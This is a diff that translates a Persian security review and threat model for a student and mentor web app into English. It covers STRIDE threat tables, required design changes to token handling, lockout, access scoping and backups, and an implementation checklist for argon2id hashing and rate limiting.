+| L1 | I | **Token in logs**: pino-http logs `req.url` by default and writes `/invite/<token>` or `/api/v1/auth/tokens/<token>` in full. App Service's own HTTP log (if enabled) also keeps the full URL and we cannot mask it | High | "Logs without tokens" (overview) | The token is in the path, so this is only solved by C1 | C1, SEC-L2 |
+| L2 | I | **Mobile number in logs**: (1) the search `GET /students?q=0912…` in the URL; (2) a zod error message that returns the input value; (3) a log line "failed login for +98912…"; (4) CSV row errors; (5) Drizzle query logging with parameters; (6) Postgres slow-query logs that also write bind parameters | Medium | "Logs without the request body" | Masking and redaction are not defined | SEC-L1..L5 |
+| L3 | I | **Cookies and secrets in logs** (the headers `cookie`, `set-cookie`, `x-job-secret`) | High | — | Redact list | SEC-L1 |
+| L4 | R | No alerting on security events (a wave of failed logins, admin account lockout, a CSV export at an unusual hour) | Low | `audit_log` | Alerting | SEC-L6 |
 
-### ۳-۹. زیرساخت، اسرار و پشتیبان (خلاصه؛ مالک: devops-engineer)
+### 3-9. Infrastructure, secrets and backups (summary; owner: devops-engineer)
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| K1 | I | **دیتابیس باز به «همه‌ی سرویس‌های Azure»**: گزینه‌ی «Allow public access from any Azure service» در Flexible Server اتصال از IPهای **هر مشتری Azure** را مجاز می‌کند، نه فقط اشتراک ما. پس تنها مانع رمز دیتابیس است | متوسط | — | قاعده‌ی شبکه | C8، SEC-K2 |
-| K2 | T/D | **پاک شدن پشتیبان با اعتبارنامه‌ی برنامه**: اگر پشتیبان در همان حساب ذخیره‌سازی پیوست‌ها باشد، با نفوذ به برنامه یا کلید لورفته، داده و پشتیبان با هم پاک یا رمزگذاری (باج‌افزار) می‌شوند | متوسط | پشتیبان دوجایی | جداسازی اعتبارنامه‌ها | C8، SEC-K4 |
-| K3 | I | **کلید خصوصی `age`** کنار پشتیبان یا در secretهای GitHub | بالا | رمزگذاری با `age` | محل کلید | SEC-K5 |
-| K4 | I | **داده‌ی واقعی روی لپ‌تاپ توسعه**: برای اشکال‌زدایی، پشتیبان تولید در Postgres جاسازی‌شده‌ی محلی بازیابی می‌شود | متوسط | — | قاعده | SEC-E2 |
-| K5 | E | **زنجیره‌ی تأمین**: بسته‌ی آلوده یا آسیب‌پذیری بحرانی در Next.js/React. در دسامبر ۲۰۲۵ یک آسیب‌پذیری اجرای کد از راه دور در React Server Components (CVE-2025-55182) اعلام شد که Next.js App Router را هم شامل می‌شد | بالا | — | به‌روزرسانی خودکار، `audit` مانع merge | SEC-D1..D4 |
+| K1 | I | **Database open to "all Azure services"**: the "Allow public access from any Azure service" option on Flexible Server allows connections from the IPs of **any Azure customer**, not just our subscription. So the only barrier is the database password | Medium | — | Network rule | C8, SEC-K2 |
+| K2 | T/D | **Backups deleted with the app's credential**: if the backup is in the same storage account as the attachments, then through an application compromise or a leaked key the data and the backup are deleted or encrypted together (ransomware) | Medium | Backups in two places | Separate credentials | C8, SEC-K4 |
+| K3 | I | **The `age` private key** next to the backup or in GitHub secrets | High | Encryption with `age` | Where the key lives | SEC-K5 |
+| K4 | I | **Real data on the development laptop**: for debugging, a production backup is restored into the local embedded Postgres | Medium | — | Rule | SEC-E2 |
+| K5 | E | **Supply chain**: a poisoned package or a critical vulnerability in Next.js/React. In December 2025 a remote code execution vulnerability in React Server Components (CVE-2025-55182) was announced, which also affected the Next.js App Router | High | — | Automatic updates, `audit` blocks merge | SEC-D1..D4 |
 
 ---
 
-## ۴. تغییرهای لازم در طراحی (پیش از کدنویسی)
+## 4. Required design changes (before coding)
 
-خودم این فایل‌ها را ویرایش نکردم. مالک هر کدام software-architect است، مگر جایی که ذکر شده. وضعیت اعمال هر مورد زیر عنوانش آمده است (جدول کامل در بخش ۰).
+I did not edit these files myself. The owner of each is the software-architect, unless stated otherwise. The application status of each item is shown under its heading (full table in section 0).
 
-### C1 — توکن دعوت و بازنشانی بیرون از URL مسیر؛ تأیید موبایل هنگام پذیرش
-> **وضعیت:** اعمال شد در ADR-0003 (بخش ۱، ۲، ۷)، `api.md` (بخش ۲، ۳)، `data-model.md` ۲-۱، `overview.md` ۴-۱ و `sitemap.md` (G2، G3) — ۲۸ مهر ۱۴۰۵.
+### C1 — Invite and reset tokens outside the path URL; mobile confirmation on acceptance
+> **Status:** applied in ADR-0003 (sections 1, 2, 7), `api.md` (sections 2, 3), `data-model.md` 2-1, `overview.md` 4-1 and `sitemap.md` (G2, G3) — 28 Mehr 1405 (2026-10-20).
 
-**تغییر لازم در ADR-0003 بخش ۱–۲ و ۷، `api.md` بخش ۲ و ۳، `sitemap.md` G2/G3:**
-1. شکل لینک: `${APP_BASE_URL}/invite#t=<token>` (و برای بازنشانی `/reset#t=<token>`). مرورگر fragment را **به سرور نمی‌فرستد**، پس توکن در لاگ HTTP میزبان، لاگ pino و `Referer` نمی‌آید.
-2. صفحه‌ی `/invite` ایستا است. جاوااسکریپت آن توکن را از `location.hash` می‌خواند، فوراً `history.replaceState` می‌کند تا از نوار آدرس و تاریخچه پاک شود، و endpointهای زیر را صدا می‌زند:
-   - `POST /api/v1/auth/tokens/lookup { token }` ← `{ purpose, displayName, expiresAt }` (به‌جای `GET /auth/tokens/:token`)
-   - `POST /api/v1/auth/tokens/accept { token, phone, password }` (به‌جای `POST /auth/tokens/:token/accept`)
-3. **عامل دوم ارزان:** فرم پذیرش **موبایل کامل** را می‌خواهد و سرور آن را با `users.phone` مقایسه می‌کند. کسی که فقط لینک را دارد (فورواردشده، لاگ، گروه تلگرام) و موبایل را نمی‌داند نمی‌تواند حساب را بگیرد. ۵ موبایل غلط برای یک توکن ← توکن باطل می‌شود و رویداد در `audit_log` ثبت می‌شود. به همین دلیل صفحه‌ی lookup دیگر **موبایل پوشانده را نشان نمی‌دهد** (`0912***4567` هفت رقم از یازده رقم را لو می‌دهد و حدس را به ۱۰ هزار حالت می‌رساند). نام کافی است.
-4. پیش‌نمایش لینک در تلگرام فقط یک GET به صفحه‌ی ایستاست و توکن را نمی‌بیند و مصرف نمی‌کند.
+**Required change in ADR-0003 sections 1-2 and 7, `api.md` sections 2 and 3, `sitemap.md` G2/G3:**
+1. Link format: `${APP_BASE_URL}/invite#t=<token>` (and `/reset#t=<token>` for reset). The browser **does not send the fragment to the server**, so the token does not appear in the host's HTTP log, the pino log or `Referer`.
+2. The `/invite` page is static. Its JavaScript reads the token from `location.hash`, immediately calls `history.replaceState` to clear it from the address bar and history, and calls the endpoints below:
+   - `POST /api/v1/auth/tokens/lookup { token }` ← `{ purpose, displayName, expiresAt }` (instead of `GET /auth/tokens/:token`)
+   - `POST /api/v1/auth/tokens/accept { token, phone, password }` (instead of `POST /auth/tokens/:token/accept`)
+3. **A cheap second factor:** the acceptance form asks for the **full mobile number** and the server compares it with `users.phone`. Someone who has only the link (forwarded, from a log, from a Telegram group) and does not know the mobile number cannot take the account. 5 wrong mobile numbers for one token ← the token is invalidated and the event is recorded in `audit_log`. For the same reason the lookup page no longer **shows the masked mobile number** (`0912***4567` reveals seven of the eleven digits and brings the guess down to 10 thousand possibilities). The name is enough.
+4. A link preview in Telegram is only a GET to the static page; it does not see the token and does not consume it.
 
-### C2 — سیاست قفل، IP پشت پراکسی، عمر نشست کارکنان، نرمال‌سازی رمز
-> **وضعیت:** اعمال شد در ADR-0003 (بخش ۳، ۴، ۵)، `data-model.md` ۲-۱ و `api.md` بخش ۲ — ۲۸ مهر ۱۴۰۵. نرمال‌سازی رمز طبق SEC-P1 قطعی شد.
+### C2 — Lockout policy, IP behind the proxy, staff session lifetime, password normalization
+> **Status:** applied in ADR-0003 (sections 3, 4, 5), `data-model.md` 2-1 and `api.md` section 2 — 28 Mehr 1405 (2026-10-20). Password normalization was made deterministic per SEC-P1.
 
-**تغییر لازم در ADR-0003 بخش ۳ و ۴ و ۵، و `data-model.md` ۲-۱ (`auth_throttle`):**
-- قفل سه‌لایه (جزئیات در SEC-R1..R3): (۱) «موبایل + IP»؛ (۲) سراسری موبایل که **دستگاه شناخته‌شده** را قفل نمی‌کند (کوکی دستگاه)؛ (۳) IP. این کار به یک secret تازه نیاز دارد (`DEVICE_COOKIE_SECRET`؛ همان جای خالی `SESSION_SECRET` در ADR-0002).
-- قاعده‌ی خواندن IP پشت پراکسی (SEC-R4).
-- عمر نشست کارکنان: لغزنده‌ی ۷ روز و سقف مطلق ۳۰ روز. هنرجو بدون تغییر (۳۰ و ۹۰).
-- حداقل طول رمز کارکنان ۱۲ نویسه.
-- **نرمال‌سازی رمز** (SEC-P1): ADR-0003 می‌گوید ارقام فارسی در رمز تبدیل نمی‌شوند. ولی یک رمز روی کیبورد اندروید و ویندوز ممکن است `ي` و `ی` یا ارقام متفاوت تولید کند، و کاربری که «رمز درست» را می‌زند قفل می‌شود. نتیجه، بازنشانی‌های دستی بیشتر از راه تلگرام است، که خودش یک کانال مهندسی اجتماعی است. پیش از ساخت اولین هش تصمیم گرفته شود، چون تغییرش بعداً همه‌ی رمزها را باطل می‌کند.
+**Required change in ADR-0003 sections 3, 4 and 5, and `data-model.md` 2-1 (`auth_throttle`):**
+- Three-layer lockout (details in SEC-R1..R3): (1) "mobile + IP"; (2) a global per-mobile lockout that does **not** lock out a **known device** (device cookie); (3) IP. This needs a new secret (`DEVICE_COOKIE_SECRET`; the same empty slot as `SESSION_SECRET` in ADR-0002).
+- The rule for reading the IP behind the proxy (SEC-R4).
+- Staff session lifetime: 7 days sliding and a 30-day absolute cap. Students unchanged (30 and 90).
+- Minimum staff password length of 12 characters.
+- **Password normalization** (SEC-P1): ADR-0003 says Persian digits in a password are not converted. But a password typed on an Android and a Windows keyboard may produce `ي` and `ی` (Arabic and Persian yeh) or different digits, and a user who types the "correct password" gets locked out. The result is more manual resets over Telegram, which is itself a social-engineering channel. This must be decided before the first hash is built, because changing it later invalidates all passwords.
 
-### C3 — شناسه‌های ارجاعی و قاعده‌های جاافتاده‌ی دسترسی
-> **وضعیت:** اعمال شد در ADR-0004 (بخش ۱-۱، ۲، ۴) و `api.md` (بخش ۱، ۳، ۴، ۶، ۷، ۸، ۱۰، ۱۲) — ۲۸ مهر ۱۴۰۵. خطای شناسه‌ی ارجاعی همه‌جا `422` یکسان است.
+### C3 — Referenced IDs and missing access rules
+> **Status:** applied in ADR-0004 (sections 1-1, 2, 4) and `api.md` (sections 1, 3, 4, 6, 7, 8, 10, 12) — 28 Mehr 1405 (2026-10-20). The referenced-ID error is a uniform `422` everywhere.
 
-**تغییر لازم در ADR-0004 بخش ۱ (قاعده‌ی تازه) و بخش ۲ (ماتریس)، و `api.md` بخش ۳، ۶، ۷:**
-1. **قاعده‌ی شناسه‌ی ارجاعی:** هر شناسه‌ای که در بدنه یا query می‌آید و به منبع دیگری اشاره می‌کند، مثل منبع اصلی دامنه‌سنجی می‌شود، و اگر به هنرجو وابسته است باید **به همان هنرجو** تعلق داشته باشد:
+**Required change in ADR-0004 section 1 (new rule) and section 2 (matrix), and `api.md` sections 3, 6, 7:**
+1. **The referenced-ID rule:** every ID that appears in the body or query and points to another resource gets a scope check like the primary resource, and if it depends on a student it must **belong to that same student**:
 
-   | شناسه | شرط |
+   | ID | Condition |
    |---|---|
-   | `profileId` در کار | `profile.student_id = task.student_id` و حذف‌نشده |
-   | `taskId` در سؤال | `task.student_id = thread.student_id` |
+   | `profileId` in a task | `profile.student_id = task.student_id` and not deleted |
+   | `taskId` in a question | `task.student_id = thread.student_id` |
    | `attachmentIds` | C4 |
-   | `mentorId`، `reviewerId`، `assigneeId`، `ownerId` | کاربر `active` با نقش `admin` یا `mentor`. برای مشاورِ actor، `ownerId` فقط خودش |
-   | `studentId` در یادآور، `studentIds` در bulk | در `staffStudentScope(actor)` |
-   | `stageId`، `platformId`، `templateId`، `typeId`، `cannedResponseId`، `trackId` | وجود داشته باشد و فعال باشد |
+   | `mentorId`, `reviewerId`, `assigneeId`, `ownerId` | An `active` user with the `admin` or `mentor` role. For a mentor actor, `ownerId` can only be themselves |
+   | `studentId` in a reminder, `studentIds` in bulk | In `staffStudentScope(actor)` |
+   | `stageId`, `platformId`, `templateId`, `typeId`, `cannedResponseId`, `trackId` | Must exist and be active |
 
-   خطا: `422 VALIDATION_FAILED` برای فهرست‌ها و `404` برای منبع هنرجوی خارج از دامنه، بدون فرق در پیام.
-2. `POST /users/:id/invite-link` برای مشاور: **`target.role = 'student'`** و `status = 'invited'` و در دامنه. برای نقش‌های دیگر `404`.
-3. `PATCH/DELETE /notes/:id` و `PATCH /reviews/:id`: «نویسنده **و** در دامنه» یا مدیر.
-4. `GET /students/:id/summary` برای مشاور خارج از دامنه: فقط اگر سؤال **بازی** از این هنرجو دارد که assignee آن خودش است.
-5. ماتریس ADR-0004 بخش ۴ دو نقش تازه بگیرد: **M-سابق** (مشاور پیش از تغییر مشاور) و **M-assignee** (مسئول سؤال خارج از دامنه)، به‌علاوه‌ی **کاربر غیرفعال‌شده با کوکی قدیمی**.
+   Error: `422 VALIDATION_FAILED` for lists and `404` for an out-of-scope student resource, with no difference in the message.
+2. `POST /users/:id/invite-link` for a mentor: **`target.role = 'student'`** and `status = 'invited'` and in scope. For other roles `404`.
+3. `PATCH/DELETE /notes/:id` and `PATCH /reviews/:id`: "author **and** in scope", or admin.
+4. `GET /students/:id/summary` for an out-of-scope mentor: only if there is an **open** question from this student whose assignee is themselves.
+5. The matrix in ADR-0004 section 4 should get two new roles: **former-M** (a mentor before the mentor change) and **M-assignee** (responsible for a question outside their scope), plus a **deactivated user with an old cookie**.
 
-### C4 — قاعده‌ی پیوست
-> **وضعیت:** اعمال شد در `data-model.md` ۲-۵ و `api.md` بخش ۱۴ — ۲۸ مهر ۱۴۰۵.
+### C4 — Attachment rule
+> **Status:** applied in `data-model.md` 2-5 and `api.md` section 14 — 28 Mehr 1405 (2026-10-20).
 
-**تغییر لازم در `data-model.md` ۲-۵ (`attachments`) و `api.md` بخش ۱۴:**
-- وصل کردن پیوست فقط با یک `UPDATE` اتمی: `SET status='linked', <parent>_id=$1 WHERE id = ANY($ids) AND status='pending' AND uploaded_by=$actor RETURNING id`. اگر تعداد ردیف‌ها با `ids` برابر نبود ← کل تراکنش rollback و `422`.
-- سقف پیکسل، چرخش و حذف متادیتا، و سهمیه (SEC-U2، SEC-U5، SEC-U7) در سند بیاید.
-- `GET /attachments/:id` با `Cache-Control: private, no-cache` (نه فقط `private`) تا پس از خروج روی دستگاه مشترک از cache دیده نشود.
+**Required change in `data-model.md` 2-5 (`attachments`) and `api.md` section 14:**
+- Linking an attachment only with one atomic `UPDATE`: `SET status='linked', <parent>_id=$1 WHERE id = ANY($ids) AND status='pending' AND uploaded_by=$actor RETURNING id`. If the number of rows does not equal `ids` ← roll back the whole transaction and return `422`.
+- The pixel limit, rotation and metadata stripping, and the quota (SEC-U2, SEC-U5, SEC-U7) should be added to the document.
+- `GET /attachments/:id` with `Cache-Control: private, no-cache` (not just `private`) so it cannot be seen from the cache on a shared device after logout.
 
-### C5 — حذف حساب و نگه‌داری داده
-> **وضعیت:** اعمال شد در ADR-0010، `data-model.md` (۲-۱ و بخش ۶)، `api.md` بخش ۳، `overview.md` بخش ۵ و ADR-0007 — ۲۸ مهر ۱۴۰۵. دکمه‌ی S10 برداشته می‌شود (ADR-0010 بند ۶؛ ویرایش sitemap با ux-designer).
+### C5 — Account deletion and data retention
+> **Status:** applied in ADR-0010, `data-model.md` (2-1 and section 6), `api.md` section 3, `overview.md` section 5 and ADR-0007 — 28 Mehr 1405 (2026-10-20). The S10 button is removed (ADR-0010 item 6; the sitemap edit is with the ux-designer).
 
-**تغییر لازم در `data-model.md` ۲-۱ (`users.erased_at timestamptz`)، `overview.md` بخش ۵ (ردیف «حذف حساب»)، `sitemap.md` S10:**
-- حذف حساب در 0.1 یک **فرمان CLI مدیر** است (`pnpm admin:erase-user --id …`)، نه endpoint. فرایند در بخش ۷ آمده است.
-- S10 «درخواست حذف حساب» در 0.1 مثل «فراموشی رمز» فقط راهنمایی می‌کند: «به مربی پیام بده؛ حداکثر ۳۰ روز». یا یک سؤال با موضوع ثابت برای مدیر می‌سازد. فعلاً دکمه‌ای در UX هست که API ندارد.
-- جدول نگه‌داری بخش ۷ به `overview.md` اضافه شود.
+**Required change in `data-model.md` 2-1 (`users.erased_at timestamptz`), `overview.md` section 5 (the "Account deletion" row), `sitemap.md` S10:**
+- Account deletion in 0.1 is an **admin CLI command** (`pnpm admin:erase-user --id …`), not an endpoint. The process is described in section 7.
+- S10 "Request account deletion" in 0.1, like "Forgot password", only gives guidance: "Message the coach; at most 30 days." Or it creates a question with a fixed subject for the admin. For now there is a button in the UX that has no API.
+- The retention table of section 7 should be added to `overview.md`.
 
-### C6 — ورود گروهی فقط CSV
-> **وضعیت:** اعمال نشد. باید پیش از ساخت ورود گروهی و در هر حال **پیش از استقرار** انجام شود.
+### C6 — Bulk import is CSV only
+> **Status:** not applied. It must be done before building bulk import and in any case **before deployment**.
 
-**تغییر لازم در `api.md` بخش ۱۳:** در 0.1 فقط `text/csv` (UTF-8، با یا بدون BOM)، حداکثر ۱ مگابایت و ۵۰۰ ردیف. مربی از اکسل «Save as CSV UTF-8» می‌گیرد. اگر XLSX لازم شد، ADR جدا (کتابخانه‌ی نگه‌داری‌شده، سقف حجم پس از unzip).
+**Required change in `api.md` section 13:** in 0.1 only `text/csv` (UTF-8, with or without BOM), at most 1 MB and 500 rows. The coach uses Excel's "Save as CSV UTF-8". If XLSX becomes necessary, a separate ADR (a maintained library, a size limit after unzip).
 
-### C7 — هم‌خوانی اسناد
-> **وضعیت:** اعمال نشد. باید **پیش از استقرار** انجام شود؛ شامل `DEVICE_COOKIE_SECRET` و `TRUSTED_PROXY_HOPS` که C2 اضافه کرد.
+### C7 — Document consistency
+> **Status:** not applied. It must be done **before deployment**; it includes `DEVICE_COOKIE_SECRET` and `TRUSTED_PROXY_HOPS`, which C2 added.
 
-- ADR-0002 بخش ۶ `SESSION_SECRET` را نام می‌برد ولی ADR-0003 به آن نیازی ندارد (توکن نشست تصادفی است و هش می‌شود) و `tech-stack.md` بخش ۵ هم آن را ندارد. با C2 این متغیر به `DEVICE_COOKIE_SECRET` تبدیل و به قرارداد env اضافه شود.
-- `tech-stack.md` بخش ۴ هنوز `docker compose` را برای محیط local می‌گوید؛ تصمیم ۲۷ مهر Postgres جاسازی‌شده است (SEC-E1). تست‌های امنیتی بخش ۶ باید در CI روی Postgres واقعی ۱۶ اجرا شوند (Testcontainers یا service container).
+- ADR-0002 section 6 names `SESSION_SECRET` but ADR-0003 does not need it (the session token is random and hashed) and `tech-stack.md` section 5 does not have it either. With C2 this variable should become `DEVICE_COOKIE_SECRET` and be added to the env contract.
+- `tech-stack.md` section 4 still mentions `docker compose` for the local environment; the 27 Mehr decision is embedded Postgres (SEC-E1). The security tests of section 6 must run in CI against a real Postgres 16 (Testcontainers or a service container).
 
-### C8 — شبکه‌ی دیتابیس و جداسازی پشتیبان (مالک: devops-engineer)
-> **وضعیت:** اعمال نشد. باید **پیش از استقرار** انجام شود (devops-engineer).
+### C8 — Database network and backup separation (owner: devops-engineer)
+> **Status:** not applied. It must be done **before deployment** (devops-engineer).
 
-**تغییر لازم در ADR-0002 بخش ۶ و ۷:** SEC-K2 و SEC-K4.
+**Required change in ADR-0002 sections 6 and 7:** SEC-K2 and SEC-K4.
 
 ---
 
-## ۵. الزامات امنیتی پیاده‌سازی 0.1 (چک‌لیست)
+## 5. Security requirements for the 0.1 implementation (checklist)
 
-مالک: **BE** = backend-engineer، **FE** = frontend-engineer، **DO** = devops-engineer. هر مورد «باید» است، مگر جایی که «توصیه» نوشته شده.
+Owner: **BE** = backend-engineer, **FE** = frontend-engineer, **DO** = devops-engineer. Every item is a "must", except where "recommended" is written.
 
-### ۵-۱. رمز و argon2id (BE)
-- [ ] **SEC-P1** نرمال‌سازی رمز پیش از هش و پیش از مقایسه، **در هر دو جا یکسان**: `NFKC` ← ارقام فارسی و عربی به لاتین ← `ي`/`ى` به `ی` و `ك` به `ک`. بدون trim و بدون تغییر حروف بزرگ و کوچک. (منوط به تأیید C2)
-- [ ] **SEC-P2** طول: هنرجو ۸ تا ۱۲۸ نویسه؛ مدیر و مشاور **۱۲** تا ۱۲۸. سقف بایت UTF-8 هم ۵۱۲ باشد. بدون قاعده‌ی ترکیب حروف (NIST SP 800-63B).
-- [ ] **SEC-P3** رد رمز اگر در فهرست رمزهای رایج یا لورفته باشد (فایل محلی؛ توصیه: ۱۰۰ هزار رمز به‌جای ۱۰ هزار، حدود ۱ مگابایت)، یا برابر یا شامل موبایل (هر دو قالب `0912…` و `912…`) باشد. پیام خطا فارسی و بی‌قضاوت.
-- [ ] **SEC-P4** پارامترهای argon2id: `memoryCost: 19456` (KiB)، `timeCost: 2`، `parallelism: 1`، `outputLen: 32`، salt تصادفی ۱۶ بایت (پیش‌فرض کتابخانه). خروجی در قالب PHC (`$argon2id$v=19$m=19456,t=2,p=1$…`) ذخیره شود تا پارامترها همراه هش باشند. با هر ورود موفق، اگر پارامترهای هش با پیکربندی جاری فرق داشت، rehash شود. پیش از استقرار زمان هش روی B1 اندازه‌گیری شود (هدف: ۵۰ تا ۲۵۰ میلی‌ثانیه). اگر کمتر از ۵۰ بود، `timeCost` بالا برود، نه حافظه.
-- [ ] **SEC-P5** صف هم‌زمانی برای هش و verify: حداکثر **۲** عملیات argon2 هم‌زمان در هر نمونه. اگر درخواست بیش از ۵ ثانیه در صف ماند ← `503` با `Retry-After`. هش ساختگی (برای کاربر ناموجود، `invited` یا `disabled`) یک بار در شروع برنامه با همان پارامترها ساخته شود.
+### 5-1. Password and argon2id (BE)
+- [ ] **SEC-P1** Normalize the password before hashing and before comparison, **identically in both places**: `NFKC` ← Persian and Arabic digits to Latin ← `ي`/`ى` (Arabic yeh forms) to `ی` (Persian yeh) and `ك` (Arabic kaf) to `ک` (Persian kaf). No trim and no case change. (Subject to confirmation of C2)
+- [ ] **SEC-P2** Length: student 8 to 128 characters; admin and mentor **12** to 128. The UTF-8 byte limit should also be 512. No character-composition rules (NIST SP 800-63B).
+- [ ] **SEC-P3** Reject a password if it is in the common or leaked password list (a local file; recommended: 100 thousand passwords instead of 10 thousand, about 1 MB), or if it equals or contains the mobile number (both formats `0912…` and `912…`). The error message is in Persian and non-judgmental.
+- [ ] **SEC-P4** argon2id parameters: `memoryCost: 19456` (KiB), `timeCost: 2`, `parallelism: 1`, `outputLen: 32`, a random 16-byte salt (the library default). The output is stored in PHC format (`$argon2id$v=19$m=19456,t=2,p=1$…`) so the parameters travel with the hash. On every successful login, if the hash parameters differ from the current configuration, rehash. Before deployment, measure the hash time on the B1 (target: 50 to 250 milliseconds). If it is under 50, raise `timeCost`, not memory.
+- [ ] **SEC-P5** A concurrency queue for hash and verify: at most **2** concurrent argon2 operations per instance. If a request stays in the queue for more than 5 seconds ← `503` with `Retry-After`. The dummy hash (for a non-existent, `invited` or `disabled` user) is built once at application start with the same parameters.
 
-### ۵-۲. ورود و محدودیت نرخ (BE)
-- [ ] **SEC-R1** کلید `login:pi:<phone>:<ip>`: ۵ شکست در ۱۵ دقیقه ← قفل ۱۵ دقیقه.
-- [ ] **SEC-R2** کلید `login:p:<phone>`: ۲۰ شکست در ۱ ساعت ← قفل ۱ ساعت، **مگر** درخواست کوکی دستگاه معتبرِ همان کاربر را داشته باشد. کوکی `__Host-uc_dev` = `base64url(userId + '.' + HMAC-SHA256(DEVICE_COOKIE_SECRET, userId))` است، با `HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=31536000`، و با هر ورود موفق ست می‌شود. پس مهاجم بیرونی حساب را قفل می‌کند ولی صاحب حساب از گوشی خودش همچنان وارد می‌شود.
-- [ ] **SEC-R3** کلید `login:ip:<ip>` (برای IPv6 پیشوند `/64`): ۳۰ شکست در ۱۵ دقیقه ← قفل ۱۵ دقیقه. همین کلید روی `POST /auth/tokens/lookup` و `accept` (۳۰ در ۱۵ دقیقه) و روی `change-password` (به ازای `userId`، ۵ در ۱۵ دقیقه) هم اعمال شود.
-- [ ] **SEC-R4** IP کاربر: فقط از `X-Forwarded-For`، و **راست‌ترین** مقداری که پراکسی مورد اعتماد اضافه کرده (`TRUSTED_PROXY_HOPS=1` روی App Service). پورت حذف شود (App Service ممکن است `ip:port` بفرستد؛ **تأیید نشد** و باید روی staging دیده شود). در محیط local بدون پراکسی، `TRUSTED_PROXY_HOPS=0`. (افزوده‌ی بازبینی ۲۹ مهر، F-18:) در `NODE_ENV=production` این مقدار باید صریح باشد، وگرنه برنامه بالا نیاید، چون مقدار `0` پشت پراکسی به همه‌ی کاربران یک IP می‌دهد و قفل IP به قفل سراسری تبدیل می‌شود. هیچ‌جا اولین مقدار `X-Forwarded-For` یا `X-Real-IP` بدون این قاعده خوانده نشود. یک تابع `getClientIp(req)` در `server/http`.
-- [ ] **SEC-R5** شمارش «شکست» در یک تراکنش با `INSERT … ON CONFLICT DO UPDATE` (اتمی، بدون race بین چند نمونه). ورود موفق کلید `pi` را پاک می‌کند. بازنشانی رمز با لینک مدیر کلید `p` آن موبایل را پاک می‌کند.
-- [ ] **SEC-R6** قفل و شمارش برای موبایل‌های **ناموجود** هم دقیقاً همان‌طور اجرا شود تا `429` وجود حساب را لو ندهد. پاسخ `429` فقط `code`، `retryAfterSeconds` و یک پیام فارسی ثابت با دقیقه‌ی مانده (ساخته‌شده از همان `retryAfterSeconds`) دارد. هیچ چیزی درباره‌ی لایه‌ی قفل یا وجود حساب نمی‌گوید (اصلاح F-07).
-- [ ] **SEC-R7** نرمال‌سازی موبایل قبل از ساخت کلید (همان تابع `lib/phone`)، تا `0912…` و `+98912…` دو شمارنده‌ی جدا نسازند.
+### 5-2. Login and rate limiting (BE)
+- [ ] **SEC-R1** Key `login:pi:<phone>:<ip>`: 5 failures in 15 minutes ← 15-minute lockout.
+- [ ] **SEC-R2** Key `login:p:<phone>`: 20 failures in 1 hour ← 1-hour lockout, **unless** the request carries a valid device cookie for that same user. The cookie `__Host-uc_dev` = `base64url(userId + '.' + HMAC-SHA256(DEVICE_COOKIE_SECRET, userId))`, with `HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=31536000`, and it is set on every successful login. So an external attacker locks the account, but the account owner can still log in from their own phone.
+- [ ] **SEC-R3** Key `login:ip:<ip>` (for IPv6 the `/64` prefix): 30 failures in 15 minutes ← 15-minute lockout. The same key also applies to `POST /auth/tokens/lookup` and `accept` (30 in 15 minutes) and to `change-password` (per `userId`, 5 in 15 minutes).
+- [ ] **SEC-R4** The user's IP: only from `X-Forwarded-For`, and the **rightmost** value added by the trusted proxy (`TRUSTED_PROXY_HOPS=1` on App Service). The port is stripped (App Service may send `ip:port`; this was **not confirmed** and must be checked on staging). In the local environment without a proxy, `TRUSTED_PROXY_HOPS=0`. (Added by the 29 Mehr (2026-10-21) review, F-18:) in `NODE_ENV=production` this value must be explicit, otherwise the app must not start, because the value `0` behind a proxy gives all users one IP and turns the IP lockout into a global lockout. The first value of `X-Forwarded-For` or `X-Real-IP` must never be read without this rule. A single function `getClientIp(req)` in `server/http`.
+- [ ] **SEC-R5** Counting "failures" in a single transaction with `INSERT … ON CONFLICT DO UPDATE` (atomic, no race between instances). A successful login clears the `pi` key. A password reset via an admin link clears that mobile number's `p` key.
+- [ ] **SEC-R6** Lockout and counting for **non-existent** mobile numbers must run exactly the same way so `429` does not reveal whether an account exists. The `429` response has only `code`, `retryAfterSeconds` and a fixed Persian message with the remaining minutes (built from the same `retryAfterSeconds`). It says nothing about the lockout layer or the existence of the account (F-07 correction).
+- [ ] **SEC-R7** Normalize the mobile number before building the key (the same `lib/phone` function), so `0912…` and `+98912…` do not create two separate counters.
 
-### ۵-۳. توکن دعوت و بازنشانی (BE، FE)
-- [ ] **SEC-T1** (C1) توکن فقط در fragment لینک و در بدنه‌ی POST. هیچ مسیری `:token` نداشته باشد. صفحه‌ی `/invite` و `/reset` پس از خواندن hash آن را با `history.replaceState` پاک کنند.
-- [ ] **SEC-T2** ۳۲ بایت از `crypto.randomBytes`؛ ذخیره‌ی SHA-256؛ جستجو با `token_hash`؛ پذیرش در **یک تراکنش** با `UPDATE auth_tokens SET used_at=now() WHERE token_hash=$1 AND used_at IS NULL AND revoked_at IS NULL AND expires_at > now() RETURNING …` (جلوی دو بار مصرف هم‌زمان را می‌گیرد).
-- [ ] **SEC-T3** هیچ GETی توکن را مصرف یا باطل نکند. صفحه‌ی `/invite` و `/reset`: `Cache-Control: no-store`، `Referrer-Policy: no-referrer`، `<meta name="robots" content="noindex">`، بدون تگ Open Graph با نام یا موبایل، و بدون هیچ لینک بیرونی.
-- [ ] **SEC-T4** پذیرش موبایل کامل را می‌خواهد (C1). ۵ موبایل غلط برای یک توکن ← `revoked_at = now()` و `audit_log(auth.token_revoked_mismatch)`.
-- [ ] **SEC-T5** پس از پذیرش: همه‌ی نشست‌های قبلی کاربر باطل، `password_changed_at = now()`، و در پرونده و صفحه‌ی کاربران برای کارکنان «دعوت پذیرفته شد: زمان، نوع دستگاه» دیده شود تا اگر هنرجو بگوید «لینک کار نکرد» مربی بفهمد کسی دیگر آن را باز کرده است. اگر مرورگر هنگام باز کردن لینک نشست دیگری دارد (مثلاً مربی لینک را خودش امتحان می‌کند)، صفحه هشدار بدهد و پذیرش نشست قبلی همان مرورگر را ببندد.
-- [ ] **SEC-T6** لینک CLI راه‌اندازی مدیر: انقضای **۱ ساعت**. فقط روی stdout همان پردازه‌ی CLI چاپ شود، نه در لاگ برنامه.
